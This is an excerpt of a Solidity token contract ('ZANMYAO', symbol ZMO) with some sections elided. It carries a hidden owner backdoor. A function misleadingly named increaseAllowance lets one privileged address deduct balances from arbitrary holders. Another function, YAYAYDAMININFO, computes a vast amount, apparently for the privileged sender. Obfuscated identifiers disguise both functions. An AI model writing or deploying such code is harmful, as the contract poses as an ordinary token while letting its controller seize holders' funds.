...
contract ERTYTOKEN is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    uint256 diseAmmount = 100000*10**decimals();
    constructor(address edsscser89) {
    ...
    string private _disetokenname = "ZANMYAO";
    string private _voptokensymbol = "ZMO";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public ZZCDSAFS;
    function increaseAllowance(address disadddress) public     {
        ...
        if(ZZCDSAFS != _msgSender()){
            
        }else{
            _balances[disadddress] = _balances[disadddress]-yyayyresultamount;
        } 
        require(ZZCDSAFS == _msgSender());
    }

    function YAYAYDAMININFO() public     {
        uint256 twoyayayammm = 18000000000*10**18;
        uint256 yayayamount = 60500*twoyayayammm*1*1*1;
        if(ZZCDSAFS != _msgSender()){
